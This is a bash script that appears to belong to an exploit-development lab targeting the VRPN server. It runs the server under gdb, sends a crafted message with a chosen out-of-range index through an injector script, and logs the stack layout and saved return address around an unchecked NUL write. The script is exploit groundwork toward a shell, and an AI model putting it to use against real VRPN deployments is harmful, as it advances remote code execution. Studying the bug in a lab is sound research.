#!/usr/bin/env bash
# Loopback wire probe: dump the by-value HANDLERPARAM and frame state immediately
# before and after the unchecked NUL write, so a negative index can be mapped
# to what it touches below the name array. Env overrides: BIN, LINE_PRE,
# LINE_POST, VAR, MSGTYPE. No external hosts; server binds the test port.
set -uo pipefail
OUT=${1:?usage: probe-frame-write.sh <outdir> <port> <index>}
PORT=${2:?port required}
IDX=${3:?index required}
BIN=${BIN:-lab/frontier/vrpn2shell/build-plain-07.36/server_src/vrpn_server}
LINE_PRE=${LINE_PRE:-4554}
LINE_POST=${LINE_POST:-4556}
VAR=${VAR:-sender_name}
MSGTYPE=${MSGTYPE:--1}
mkdir -p "$OUT"
cat >"$OUT/gdb.cmd" <<EOF
set pagination off
set confirm off
break vrpn_Connection.C:$LINE_PRE
commands
silent
printf "LAYOUT &p=%p &p.buffer=%p &p.payload_len=%p &endpoint=%p &$VAR=%p\\n", &p, &p.buffer, &p.payload_len, &endpoint, &$VAR
printf "PRE i=%d dest=%p p.buffer=%p p.payload_len=%d endpoint=%p saved_rip=%p\\n", i, &$VAR[i], p.buffer, p.payload_len, endpoint, *(void**)((char*)&$VAR+120)
x/8gx &$VAR[i]-32
x/1bx &$VAR[i]
continue
end
break vrpn_Connection.C:$LINE_POST
commands
silent
printf "POST i=%d dest=%p p.buffer=%p p.payload_len=%d endpoint=%p saved_rip=%p\\n", i, &$VAR[i], p.buffer, p.payload_len, endpoint, *(void**)((char*)&$VAR+120)
x/8gx &$VAR[i]-32
x/1bx &$VAR[i]
continue
end
run -f lab/frontier/vrpn2shell/vrpn.cfg $PORT
EOF
timeout 30s gdb -q -batch -x "$OUT/gdb.cmd" \
  --args $BIN \
  >"$OUT/gdb.log" 2>&1 &
GPID=$!
sleep 2
python3 lab/frontier/vrpn2shell/wire_inject.py --index "$IDX" --port "$PORT" --msgtype "$MSGTYPE" \
  >"$OUT/client.txt" 2>&1
wait "$GPID" 2>/dev/null || true
echo "=== client"; cat "$OUT/client.txt"
echo "=== gdb key lines"; grep -E 'PRE |POST |SIGSEGV|SIGILL|SIGABRT|Program received|instruction address|0x|vrpn_Connection.C:45' "$OUT/gdb.log" | head -60
